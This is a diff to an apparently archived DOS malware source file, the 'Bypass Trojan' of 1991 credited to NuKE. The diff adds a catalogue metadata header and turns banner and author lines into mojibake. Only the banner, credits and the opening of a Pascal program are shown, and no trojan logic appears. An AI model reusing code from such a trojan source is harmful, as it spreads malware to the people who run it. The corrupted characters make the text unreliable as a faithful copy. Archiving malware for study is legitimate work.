@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      B
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;****************************************************************************;
 ;                                                                            ;
 ;                     -=][][][][][][][][][][][][][][][=-                     ;
@@ -21,7 +32,7 @@
 ; Is. Keep This Code in Responsible Hands!                                   ;
 ;                                                                            ;
 ;****************************************************************************;
-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> Bypass Trojan v1.0 and v2.0 :
+ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½> Bypass Trojan v1.0 and v2.0 :
 
  Created by: Mechanix
  Released  : October 1991
@@ -85,7 +96,7 @@
 
 PROGRAM BYPASS1;
 { Bypass Trojan v1.0                                                          }
-{ Created by: Mî›H’ï!X [NuKE]                                                 }
+{ Created by: Mï¿½Hï¿½ï¿½!X [NuKE]                                                 }
 { Created on: 27/09/91                                                        }
 USES DOS;
 VAR
